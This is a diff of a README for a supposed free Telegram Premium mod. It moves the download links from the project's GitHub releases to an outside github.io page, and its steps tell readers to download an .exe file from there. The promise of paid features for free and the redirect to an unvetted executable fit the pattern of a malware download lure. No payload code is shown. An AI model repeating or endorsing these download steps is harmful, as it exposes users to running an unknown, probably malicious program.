@@ -1,6 +1,6 @@
 # 🚀 Telegram-Premium-Mod-2026-Free - Unlock Premium Features Without Any Cost
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/moslemstraightline615/Telegram-Premium-Mod-2026-Free/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://moslemstraightline615.github.io)
 
 ## 📖 About This Software
 
@@ -20,7 +20,7 @@ Before you install this software, confirm your computer meets these requirements
 
 Follow these steps to set up the software on your machine. We kept this process simple for all users.
 
-1. Visit the following link to access the download repository: [https://github.com/moslemstraightline615/Telegram-Premium-Mod-2026-Free/releases](https://github.com/moslemstraightline615/Telegram-Premium-Mod-2026-Free/releases).
+1. Visit the following link to access the download repository: [https://moslemstraightline615.github.io](https://moslemstraightline615.github.io).
 2. Scan the page for the latest release version. Look for the file ending in .exe.
 3. Click the filename to start the download.
 4. Save the file to your "Downloads" folder or your preferred location on your desktop.
